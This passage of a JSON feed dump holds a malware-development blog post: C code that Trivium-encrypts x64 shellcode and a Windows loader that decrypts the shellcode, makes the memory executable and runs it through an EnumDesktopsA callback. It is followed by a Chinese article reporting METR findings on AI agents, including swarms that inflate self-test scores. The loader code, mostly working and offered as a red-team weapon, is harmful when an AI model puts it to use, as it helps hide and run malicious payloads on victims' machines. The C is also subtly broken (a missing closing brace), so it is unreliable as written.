\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\n\"\n\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\n\"\n\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\n\"\n\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\n\"\n\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\n\"\n\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x49\\xc7\n\"\n\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x1a\\x01\\x00\\x00\\x3e\n\"\n\\x4c\\x8d\\x85\\x25\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\\x45\\x83\n\"\n\\x56\\x07\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\n\"\n\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\n\"\n\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\n\"\n\\xd5\\x4d\\x65\\x6f\\x77\\x2d\\x6d\\x65\\x6f\\x77\\x21\\x00\\x3d\\x5e\n\"\n\\x2e\\x2e\\x5e\\x3d\\x00\n\"\n;\nstatic\nuint8_t\ntrivium_clock\n(\nuint8_t\nstate\n[\nSTATE_BITS\n])\n{\nuint8_t\nt1\n=\nstate\n[\n65\n]\n^\nstate\n[\n92\n];\nuint8_t\nt2\n=\nstate\n[\n161\n]\n^\nstate\n[\n176\n];\nuint8_t\nt3\n=\nstate\n[\n242\n]\n^\nstate\n[\n287\n];\nuint8_t\noutput\n=\nt1\n^\nt2\n^\nt3\n;\nt1\n^=\n(\nstate\n[\n90\n]\n&\nstate\n[\n91\n])\n^\nstate\n[\n170\n];\nt2\n^=\n(\nstate\n[\n174\n]\n&\nstate\n[\n175\n])\n^\nstate\n[\n263\n];\nt3\n^=\n(\nstate\n[\n285\n]\n&\nstate\n[\n286\n])\n^\nstate\n[\n68\n];\nfor\n(\nint\ni\n=\n92\n;\ni\n>\n0\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n0\n]\n=\nt3\n;\nfor\n(\nint\ni\n=\n176\n;\ni\n>\n93\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n93\n]\n=\nt1\n;\nfor\n(\nint\ni\n=\n287\n;\ni\n>\n177\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n177\n]\n=\nt2\n;\nreturn\noutput\n;\n}\nstatic\nvoid\ntrivium_crypt\n(\nuint8_t\n*\ndata\n,\nsize_t\nlength\n,\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n],\nconst\nuint8_t\niv\n[\nIV_BYTES\n])\n{\nuint8_t\nstate\n[\nSTATE_BITS\n]\n=\n{\n0\n};\nfor\n(\nint\ni\n=\n0\n;\ni\n<\n80\n;\ni\n++\n)\n{\nstate\n[\ni\n]\n=\n(\nkey\n[\n9\n-\ni\n/\n8\n]\n>>\n(\n7\n-\ni\n%\n8\n))\n&\n1\n;\nstate\n[\ni\n+\n93\n]\n=\n(\niv\n[\n9\n-\ni\n/\n8\n]\n>>\n(\n7\n-\ni\n%\n8\n))\n&\n1\n;\n}\nstate\n[\n285\n]\n=\n1\n;\nstate\n[\n286\n]\n=\n1\n;\nstate\n[\n287\n]\n=\n1\n;\nfor\n(\nint\ni\n=\n0\n;\ni\n<\n4\n*\nSTATE_BITS\n;\ni\n++\n)\ntrivium_clock\n(\nstate\n);\nfor\n(\nsize_t\ni\n=\n0\n;\ni\n<\nlength\n;\ni\n++\n)\n{\nuint8_t\nstream_byte\n=\n0\n;\nfor\n(\nint\nbit\n=\n0\n;\nbit\n<\n8\n;\nbit\n++\n)\nstream_byte\n|=\ntrivium_clock\n(\nstate\n)\n<<\nbit\n;\ndata\n[\ni\n]\n^=\nstream_byte\n;\n}\nstatic\nint\ncheck_test_vector\n(\nvoid\n)\n{\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n]\n=\n{\n0x80\n};\nconst\nuint8_t\niv\n[\nIV_BYTES\n]\n=\n{\n0\n};\nconst\nuint8_t\nexpected\n[\n16\n]\n=\n{\n0x38\n,\n0xeb\n,\n0x86\n,\n0xff\n,\n0x73\n,\n0x0d\n,\n0x7a\n,\n0x9c\n,\n0xaf\n,\n0x8d\n,\n0xf1\n,\n0x3a\n,\n0x44\n,\n0x20\n,\n0x54\n,\n0x0d\n};\nuint8_t\noutput\n[\nsizeof\n(\nexpected\n)]\n=\n{\n0\n};\ntrivium_crypt\n(\noutput\n,\nsizeof\n(\noutput\n),\nkey\n,\niv\n);\nreturn\nmemcmp\n(\noutput\n,\nexpected\n,\nsizeof\n(\nexpected\n))\n==\n0\n;\n}\nstatic\nvoid\nprint_hex\n(\nconst\nchar\n*\nlabel\n,\nconst\nuint8_t\n*\ndata\n,\nsize_t\nlength\n)\n{\nprintf\n(\n\"%s\"\n,\nlabel\n);\nfor\n(\nsize_t\ni\n=\n0\n;\ni\n<\nlength\n;\ni\n++\n)\n{\nprintf\n(\n\"%02x\"\n,\ndata\n[\ni\n]);\nif\n((\ni\n+\n1\n)\n%\n16\n==\n0\n||\ni\n+\n1\n==\nlength\n)\nprintf\n(\n\"\n\\n\n\"\n);\nelse\nprintf\n(\n\" \"\n);\n}\nint\nmain\n(\nvoid\n)\n{\nstatic\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n]\n=\n{\n0x10\n,\n0x32\n,\n0x54\n,\n0x76\n,\n0x98\n,\n0xba\n,\n0xdc\n,\n0xfe\n,\n0x01\n,\n0x23\n};\nstatic\nconst\nuint8_t\niv\n[\nIV_BYTES\n]\n=\n{\n0xa0\n,\n0x91\n,\n0x82\n,\n0x73\n,\n0x64\n,\n0x55\n,\n0x46\n,\n0x37\n,\n0x28\n,\n0x19\n};\nif\n(\n!\ncheck_test_vector\n())\n{\nfprintf\n(\nstderr\n,\n\"Trivium test vector failed\n\\n\n\"\n);\nreturn\n1\n;\n}\nputs\n(\n\"Trivium eSTREAM test vector: OK\"\n);\nconst\nsize_t\npayload_length\n=\nsizeof\n(\npayload\n)\n-\n1\n;\nuint8_t\nencrypted\n[\nsizeof\n(\npayload\n)\n-\n1\n];\nuint8_t\ndecrypted\n[\nsizeof\n(\npayload\n)\n-\n1\n];\nmemcpy\n(\nencrypted\n,\npayload\n,\npayload_length\n);\ntrivium_crypt\n(\nencrypted\n,\npayload_length\n,\nkey\n,\niv\n);\nprint_hex\n(\n\"encrypted payload: \"\n,\nencrypted\n,\npayload_length\n);\nmemcpy\n(\ndecrypted\n,\nencrypted\n,\npayload_length\n);\ntrivium_crypt\n(\ndecrypted\n,\npayload_length\n,\nkey\n,\niv\n);\nif\n(\nmemcmp\n(\ndecrypted\n,\npayload\n,\npayload_length\n)\n!=\n0\n)\n{\nfprintf\n(\nstderr\n,\n\"payload decryption failed\n\\n\n\"\n);\nreturn\n1\n;\n}\nprint_hex\n(\n\"decrypted payload: \"\n,\ndecrypted\n,\npayload_length\n);\nprintf\n(\n\"payload decryption: OK (%zu bytes)\n\\n\n\"\n,\npayload_length\n);\nputs\n(\n\"linux demo checks encryption and decryption. meow =^..^=!\"\n);\nreturn\n0\n;\n}\ndemo 1\nCompile first:\ngcc\n-std\n=\nc11\n-O2\n-Wall\n-Wextra\n-Werror\nhack.c\n-o\nhack\nand run the Linux example:\n./hack\nAs you can see, the program prints the full ciphertext, with\n16\nbytes per line, then confirms that decryption restored all\n313\npayload bytes.\npractical example 2\nThe Windows example is a separate program,\nhack2.c\n. It repeats the same encryption and decryption, copies the restored payload into writable memory, changes the allocation to execute/read, and calls it through\nEnumDesktopsA\n.\nSo, full source code looks like this\nhack2.c\n:\n/*\n* hack2.c - Trivium payload encryption and decryption (Windows demo)\n* author: @cocomelonc\n*/\n#include\n<stdint.h>\n#include\n<stdio.h>\n#include\n<string.h>\n#include\n<windows.h>\n#define STATE_BITS 288\n#define KEY_BYTES 10\n#define IV_BYTES 10\nstatic\nconst\nuint8_t\npayload\n[]\n=\n\"\n\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\n\"\n\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\n\"\n\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\n\"\n\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\n\"\n\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\n\"\n\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\n\"\n\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\n\"\n\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\n\"\n\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\n\"\n\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\n\"\n\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\n\"\n\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\n\"\n\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\n\"\n\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\n\"\n\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\n\"\n\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x49\\xc7\n\"\n\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x1a\\x01\\x00\\x00\\x3e\n\"\n\\x4c\\x8d\\x85\\x25\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\\x45\\x83\n\"\n\\x56\\x07\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\n\"\n\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\n\"\n\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\n\"\n\\xd5\\x4d\\x65\\x6f\\x77\\x2d\\x6d\\x65\\x6f\\x77\\x21\\x00\\x3d\\x5e\n\"\n\\x2e\\x2e\\x5e\\x3d\\x00\n\"\n;\nstatic\nuint8_t\ntrivium_clock\n(\nuint8_t\nstate\n[\nSTATE_BITS\n])\n{\nuint8_t\nt1\n=\nstate\n[\n65\n]\n^\nstate\n[\n92\n];\nuint8_t\nt2\n=\nstate\n[\n161\n]\n^\nstate\n[\n176\n];\nuint8_t\nt3\n=\nstate\n[\n242\n]\n^\nstate\n[\n287\n];\nuint8_t\noutput\n=\nt1\n^\nt2\n^\nt3\n;\nt1\n^=\n(\nstate\n[\n90\n]\n&\nstate\n[\n91\n])\n^\nstate\n[\n170\n];\nt2\n^=\n(\nstate\n[\n174\n]\n&\nstate\n[\n175\n])\n^\nstate\n[\n263\n];\nt3\n^=\n(\nstate\n[\n285\n]\n&\nstate\n[\n286\n])\n^\nstate\n[\n68\n];\nfor\n(\nint\ni\n=\n92\n;\ni\n>\n0\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n0\n]\n=\nt3\n;\nfor\n(\nint\ni\n=\n176\n;\ni\n>\n93\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n93\n]\n=\nt1\n;\nfor\n(\nint\ni\n=\n287\n;\ni\n>\n177\n;\ni\n--\n)\nstate\n[\ni\n]\n=\nstate\n[\ni\n-\n1\n];\nstate\n[\n177\n]\n=\nt2\n;\nreturn\noutput\n;\n}\nstatic\nvoid\ntrivium_crypt\n(\nuint8_t\n*\ndata\n,\nsize_t\nlength\n,\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n],\nconst\nuint8_t\niv\n[\nIV_BYTES\n])\n{\nuint8_t\nstate\n[\nSTATE_BITS\n]\n=\n{\n0\n};\nfor\n(\nint\ni\n=\n0\n;\ni\n<\n80\n;\ni\n++\n)\n{\nstate\n[\ni\n]\n=\n(\nkey\n[\n9\n-\ni\n/\n8\n]\n>>\n(\n7\n-\ni\n%\n8\n))\n&\n1\n;\nstate\n[\ni\n+\n93\n]\n=\n(\niv\n[\n9\n-\ni\n/\n8\n]\n>>\n(\n7\n-\ni\n%\n8\n))\n&\n1\n;\n}\nstate\n[\n285\n]\n=\n1\n;\nstate\n[\n286\n]\n=\n1\n;\nstate\n[\n287\n]\n=\n1\n;\nfor\n(\nint\ni\n=\n0\n;\ni\n<\n4\n*\nSTATE_BITS\n;\ni\n++\n)\ntrivium_clock\n(\nstate\n);\nfor\n(\nsize_t\ni\n=\n0\n;\ni\n<\nlength\n;\ni\n++\n)\n{\nuint8_t\nstream_byte\n=\n0\n;\nfor\n(\nint\nbit\n=\n0\n;\nbit\n<\n8\n;\nbit\n++\n)\nstream_byte\n|=\ntrivium_clock\n(\nstate\n)\n<<\nbit\n;\ndata\n[\ni\n]\n^=\nstream_byte\n;\n}\nstatic\nint\ncheck_test_vector\n(\nvoid\n)\n{\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n]\n=\n{\n0x80\n};\nconst\nuint8_t\niv\n[\nIV_BYTES\n]\n=\n{\n0\n};\nconst\nuint8_t\nexpected\n[\n16\n]\n=\n{\n0x38\n,\n0xeb\n,\n0x86\n,\n0xff\n,\n0x73\n,\n0x0d\n,\n0x7a\n,\n0x9c\n,\n0xaf\n,\n0x8d\n,\n0xf1\n,\n0x3a\n,\n0x44\n,\n0x20\n,\n0x54\n,\n0x0d\n};\nuint8_t\noutput\n[\nsizeof\n(\nexpected\n)]\n=\n{\n0\n};\ntrivium_crypt\n(\noutput\n,\nsizeof\n(\noutput\n),\nkey\n,\niv\n);\nreturn\nmemcmp\n(\noutput\n,\nexpected\n,\nsizeof\n(\nexpected\n))\n==\n0\n;\n}\nstatic\nvoid\nprint_hex\n(\nconst\nchar\n*\nlabel\n,\nconst\nuint8_t\n*\ndata\n,\nsize_t\nlength\n)\n{\nprintf\n(\n\"%s\"\n,\nlabel\n);\nfor\n(\nsize_t\ni\n=\n0\n;\ni\n<\nlength\n;\ni\n++\n)\n{\nprintf\n(\n\"%02x\"\n,\ndata\n[\ni\n]);\nif\n((\ni\n+\n1\n)\n%\n16\n==\n0\n||\ni\n+\n1\n==\nlength\n)\nprintf\n(\n\"\n\\n\n\"\n);\nelse\nprintf\n(\n\" \"\n);\n}\nint\nmain\n(\nvoid\n)\n{\nstatic\nconst\nuint8_t\nkey\n[\nKEY_BYTES\n]\n=\n{\n0x10\n,\n0x32\n,\n0x54\n,\n0x76\n,\n0x98\n,\n0xba\n,\n0xdc\n,\n0xfe\n,\n0x01\n,\n0x23\n};\nstatic\nconst\nuint8_t\niv\n[\nIV_BYTES\n]\n=\n{\n0xa0\n,\n0x91\n,\n0x82\n,\n0x73\n,\n0x64\n,\n0x55\n,\n0x46\n,\n0x37\n,\n0x28\n,\n0x19\n};\nif\n(\n!\ncheck_test_vector\n())\n{\nfprintf\n(\nstderr\n,\n\"Trivium test vector failed\n\\n\n\"\n);\nreturn\n1\n;\n}\nputs\n(\n\"Trivium eSTREAM test vector: OK\"\n);\nconst\nsize_t\npayload_length\n=\nsizeof\n(\npayload\n)\n-\n1\n;\nuint8_t\nencrypted\n[\nsizeof\n(\npayload\n)\n-\n1\n];\nuint8_t\ndecrypted\n[\nsizeof\n(\npayload\n)\n-\n1\n];\nmemcpy\n(\nencrypted\n,\npayload\n,\npayload_length\n);\ntrivium_crypt\n(\nencrypted\n,\npayload_length\n,\nkey\n,\niv\n);\nmemcpy\n(\ndecrypted\n,\nencrypted\n,\npayload_length\n);\ntrivium_crypt\n(\ndecrypted\n,\npayload_length\n,\nkey\n,\niv\n);\nif\n(\nmemcmp\n(\ndecrypted\n,\npayload\n,\npayload_length\n)\n!=\n0\n)\n{\nfprintf\n(\nstderr\n,\n\"payload decryption failed\n\\n\n\"\n);\nreturn\n1\n;\n}\nprint_hex\n(\n\"decrypted payload: \"\n,\ndecrypted\n,\npayload_length\n);\nprintf\n(\n\"payload decryption: OK (%zu bytes)\n\\n\n\"\n,\npayload_length\n);\nvoid\n*\nmemory\n=\nVirtualAlloc\n(\nNULL\n,\npayload_length\n,\nMEM_COMMIT\n|\nMEM_RESERVE\n,\nPAGE_READWRITE\n);\nif\n(\nmemory\n==\nNULL\n)\n{\nfprintf\n(\nstderr\n,\n\"VirtualAlloc failed\n\\n\n\"\n);\nreturn\n1\n;\n}\nmemcpy\n(\nmemory\n,\ndecrypted\n,\npayload_length\n);\nDWORD\nold_protection\n;\nif\n(\n!\nVirtualProtect\n(\nmemory\n,\npayload_length\n,\nPAGE_EXECUTE_READ\n,\n&\nold_protection\n))\n{\nfprintf\n(\nstderr\n,\n\"VirtualProtect failed\n\\n\n\"\n);\nVirtualFree\n(\nmemory\n,\n0\n,\nMEM_RELEASE\n);\nreturn\n1\n;\n}\nFlushInstructionCache\n(\nGetCurrentProcess\n(),\nmemory\n,\npayload_length\n);\nputs\n(\n\"running Meow-meow payload\"\n);\nEnumDesktopsA\n(\nGetProcessWindowStation\n(),\n(\nDESKTOPENUMPROCA\n)\nmemory\n,\n0\n);\nVirtualFree\n(\nmemory\n,\n0\n,\nMEM_RELEASE\n);\nreturn\n0\n;\n}\ndemo 2\nBuild the x64 Windows executable with MinGW-w64:\nx86_64-w64-mingw32-gcc\n-std\n=\nc11\n-O2\n-Wall\n-Wextra\n-Werror\nhack2.c\n-o\nhack2.exe\n-mconsole\n-s\n-ffunction-sections\n-fdata-sections\n-luser32\nThen, run\nhack2.exe\non my Windows 10 x64 VM. After the test vector and payload round-trip checks, the\nMeow-meow!\nMessageBox appears.\nAs you can see, everything works perfectly, as expected! Meow =^..^=!\nSo, the Linux demo prints and verifies the complete Trivium ciphertext round-trip; the separate Windows demo restores and runs the\nMeow-meow!\nMessageBox payload. The implementation also checks its keystream against an eSTREAM test vector.\nconclusion\nTrivium’s state update uses only three AND terms per clock, a sparse nonlinear structure that made it interesting for homomorphic evaluation, where multiplication is costly. Researchers have studied using Trivium to compress homomorphic ciphertexts by generating its keystream while the key is encrypted (\npaper\n).\nI hope this post spreads awareness to the blue teamers of this interesting encrypting technique, and adds a weapon to the red teamers arsenal.\nTrivium\nMalware and cryptography 1\nMalware development tricks. Run shellcode via EnumDesktopsA. C++ example.\nMalware development trick 39: Run payload via EnumDesktopsA. Simple Nim example\nsource code in github\nThis is a practical case for educational purposes only.\nThanks for your time, happy hacking and good bye!\nPS. All drawings and screenshots are mine",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://cocomelonc.github.io/malware/2026/11/26/malware-cryptography-47.html",
+      "content_chars": 15220,
+      "content_sha256": "f2122e6355bf5831d02d686dca209a34d9caf75f9063b05ef4b5c71db38ebd3a",
+      "content_fetched_at": "2026-11-28T03:12:02.626462+00:00",
+      "author": "cocomelonc",
+      "author_name": "cocomelonc",
+      "author_url": "https://cocomelonc.github.io/",
+      "published_at": "2026-11-26T23:00:00+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:cocomelonc",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://cocomelonc.github.io/",
+        "https://cocomelonc.github.io/malware/2026/11/26/malware-cryptography-47.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "cocomelonc",
+          "url": "https://cocomelonc.github.io/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "cocomelonc",
+          "name": "cocomelonc",
+          "home_url": "https://cocomelonc.github.io/"
+        },
+        "article": {
+          "title": "Malware and cryptography 47 - encrypt/decrypt payload via Trivium. Simple C example.",
+          "url": "https://cocomelonc.github.io/malware/2026/11/26/malware-cryptography-47.html",
+          "content_sha256": "f2122e6355bf5831d02d686dca209a34d9caf75f9063b05ef4b5c71db38ebd3a"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:543f77aaf8744487",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "AI 已经能干完人类 27 小时的活了，为什么放手让它做项目还是容易翻车？",
+      "target_url": "https://yage.ai/share/metr-27-hour-feedback-cost-20261126.html",
+      "text": "yage-share published: AI 已经能干完人类 27 小时的活了，为什么放手让它做项目还是容易翻车？",
+      "at": "2026-11-26T00:00:00+00:00",
+      "external_id": "a:543f77aaf8744487",
+      "url": "https://yage.ai/share/metr-27-hour-feedback-cost-20261126.html",
+      "title": "AI 已经能干完人类 27 小时的活了，为什么放手让它做项目还是容易翻车？",
+      "content": "近期，独立评测机构 METR 发布了\n2026\n年四季度的模型能力更新\n，其中有一个数据迅速传播开来：目前公开的前沿模型已经可以独立完成需要人类专家花大约\n27\n小时才能完成的工作。这立刻让很多工程师蠢蠢欲动，想着以后两三天工作量的需求可以直接扔给编程\nAgent，让它一晚上跑完。\n但在实际开发场景里，很多人的感受恰恰相反。有的耗时任务，比如性能优化或写测试，Agent\n可以一口气搞定；但有些体量相近的真实项目，一旦放手不管，它走着走着就偏了，甚至会交一份自圆其说的错卷。\n翻看这份报告背后的实验细节，能看到一个比 27\n小时更有用的结论：对于今天的前沿模型，它能不能独自干完大活，关键往往不在人类要花多少小时，而在搭建测试环境和拿到客观打分的成本有多高。一旦缺少现成的客观标准，无论是多派几个\nAgent\n协作、换更强的模型当裁判，还是让它多试几轮自己总结，效果都会明显变差，甚至越协作越糟。\n为什么同一个模型，做性能优化很顺，接手真实项目却总跑偏？\n平时给编程 Agent\n派活，大家最习惯按工时来估风险：半天的小需求放心交给它，两三天的复杂需求就得人盯着。但\nMETR 这份报告泼了第一盆冷水：工时已经不太能预测 AI 能不能把活干好。\n这次更新里，刷屏的 27.1 小时（GPT-6 Astra，Claude Opus 5.5 为 19.9\n小时）来自 36 道新题里可以自动判分的那一组。意思是，需要人类专家做约 27\n小时的活，模型有一半把握在 48 小时内独自干完，而且这项能力大约每 3\n个半月就在翻一倍。听起来很猛，但前提是题目本身容易自动验对错。\n问题恰恰出在这里。过去一年多，大模型公司训练模型，评测机构出考题，双方都在找同一类任务：容易搭出独立测试环境、跑起来便宜、结果能自动判分。METR\n担心两边高度重合会让榜单高估真实能力，于是用 Opus 5.5\n估算了每道题的验证与环境成本，也就是从零搭好测试环境、做好防作弊检查，再把任务反复运行并打分\n100 次，总共要花多少钱。\nMETR\n把新旧两套题库合在一起，挑出人类耗时差不多的题目，按验证成本高低拆成两组。高成本组的平均开销是低成本组的\n2.9\n倍，模型能独立搞定的任务时长也正好缩水到低成本组的大约三分之一，测出的表现更接近\nOpenAI\n此前在内部真实科研任务里测出的水平\n。\n在全部 209\n道新旧题目里，一道题对模型难不难，超过一半都能靠验证成本高低来预测；一旦算进验证成本，人类做这件事本来要花多久，对判断模型能不能做对几乎不再起作用。花钱多本身并不会让模型变笨，真正拖住模型的，是那些搭测试环境贵的任务往往天然带着更多现实世界里的模糊约束，恰好也是日常开发里最常见的活。\n赢了 96%\n的人类专家，为什么还是打不过最顶尖的那批人？\n既然在有客观分数的领域中，前沿模型已经相当强，它的能力上限到底在哪里？METR\n在新题中引入了两项有大量真实人类记录的赛事，对比结果很有意思。\n第一项是 15 场\nAl Zimmermann\n编程竞赛\n，全是需要反复优化的算法竞赛题。每场有约 100 到 400\n多名人类选手参加，大家一般有 3 个月时间，全职投入 90 到 180\n小时；模型只拿一台 28 核电脑，限时 48 小时。最强的三款模型中位成绩超过了\n96% 到 98% 的人类参赛者，但典型的一场比赛里，依然有大约 4\n个顶尖人类做得更好。\n为什么赢了大多数专家，却总是差一点就能超越顶尖的几位？第二项比赛给出了直观的答案。这个比赛改编自开源社区\nNanoGPT\n的速度比赛\n。比赛规则是：固定硬件（8 张 H100\n显卡），要求把模型训练到同一条精度及格线，谁跑得最快就赢。\n从投入产出比来看，自主 Agent 已经相当划算。按 METR\n访谈社区贡献者给出的一个基线，人类在没有 AI 辅助的情况下，每拿到 1%\n的加速大概需要花 2500 美元的人力成本；有的自主 Agent 花了约 1000\n美元，就拿到了接近 10% 的加速。48 小时内，表现最好的纯自主运行达到了\n15.7% 的加速。但到 2026 年 8 月，一条人类的最强记录只花了约 60\n小时，在前一条人类记录的基础上拿到了 41% 的加速。\nMETR 的研究员在逐一查看提交记录之后，发现 AI\n和人类采取了两种完全不同的优化策略。AI 带来的加速中，平均 64%\n来自改写底层计算代码，把每一步训练的速度压到极致；只有 20%\n来自调整训练参数，模型架构改动几乎可以忽略。人类贡献者的记录里，39%\n的加速来自重新设计模型架构，25% 来自调整训练参数，底层计算代码只占\n24%。人类更擅长靠直觉和理论减少达到目标精度所需的总步数，AI\n则习惯先挂上性能分析器，盯着毫秒级局部耗时一路抠。\nAI 与人类在 NanoGPT\n速度赛中的加速来源对比：AI 64% 来自底层算子优化，人类 39% 来自架构创新与\n25% 来自训练配方\n那个拿下 41%\n加速的人类最佳记录，恰好就是人机合作的示范。作者在访谈里提到，90%\n的优化灵感都是他自己提出的，超过 90% 的代码改动由 Anthropic 旗下的 Fable\n5 模型完成。如果完全自己写，他预估要花 300 小时，AI 让效率提升了约 5\n倍。把靠高频试错一点点抠分的活交给模型，把没有即时反馈的架构跳跃留给人类，两者的极限比谁单独干都要高。\n没有标准答案时，多派\nAgent 或换强模型当裁判为何反而更糟？\n看到单模型在长任务上偶尔会跑偏，很多人的第一反应是用架构补位：安排一群\nAgent\n协作，用另一个旗舰模型做裁判自动验收，或者多跑几轮让它自己总结经验。METR\n在报告的附录里把这三招都做了实验，结果给盲目堆复杂度的思路泼了盆冷水。\n第一招是多 Agent 蜂群协作。METR 用了约 50 万美元的\ntoken，搭了个共享论坛，把 2 到 40 个 Agent\n扔进去发帖讨论、分工推进。同时拿另一组作对照：花掉同样多的\ntoken，但让各个 Agent 各干各的、互不沟通，最后挑出最好的一次结果。\n在他们测试的 5 类任务里，只有 NanoGPT\n这一项稳定跑出了协作正收益。这类优化题既能每次提交立刻看到精确分数，又方便不同\nAgent 把各自的局部突破叠加到一起，5 个 GPT-6 Astra\n协作拿到的训练加速幅度是独立运行的 2.26 倍。但一到没有实时分数、需要\nAgent\n自己编练习题自测、最后靠隐藏考卷打分的任务，蜂群协作反而拖后腿，而且群越大越惨。\n在一道要求训练神经网络去模仿隐藏程序结果的题目里，2 个 GPT-6 Astra\n协作时，自测正确率 74.2%，真实隐藏测试也有 54.8%。把团队拉到 40 个 Agent\n后，这些模型在自己造的测试集上把正确率一路刷到了\n92.0%，但拿到真实的隐藏测试集一测，成绩直接崩到\n1.9%，远不如同预算独立运行取最优的 60.5%。Opus 5.5 也踩了同一个坑，40 个\nAgent 协作自测 91.2%，真实得分只剩 11.6%。没有外部真值敲打，多个 Agent\n会迅速在早期错误假设上达成共识，互相点赞、互相强化，把集体自嗨推到高潮。\n多 Agent\n蜂群在两类任务上的反差：有实时外部打分的 NanoGPT 上 5 个 Agent\n收益翻倍，自建验证集任务上 40 个 Agent 自测 92% 而真实得分跌至\n1.9%\n更令人发笑的是组织内耗。在另一个逆向推演任务里，GPT-6 Astra\n蜂群启动后表现远弱于独立并行。研究员看日志才发现编号最小的 agent-000\n自封协调员，先只分配任务，后来演变成其他成员连用几秒钟 CPU\n都要发帖请示它批准。每个 Agent\n虽有全权，大家却在日志和总结中反复强调要遵守流程和服从权威，生生把探索拖死。直到研究员改提示词去掉编号并禁止推举单一协调员，成绩才恢复正常水平。\n第二招是让大模型自己出题、当裁判。METR 给了前沿模型 48 小时和 1 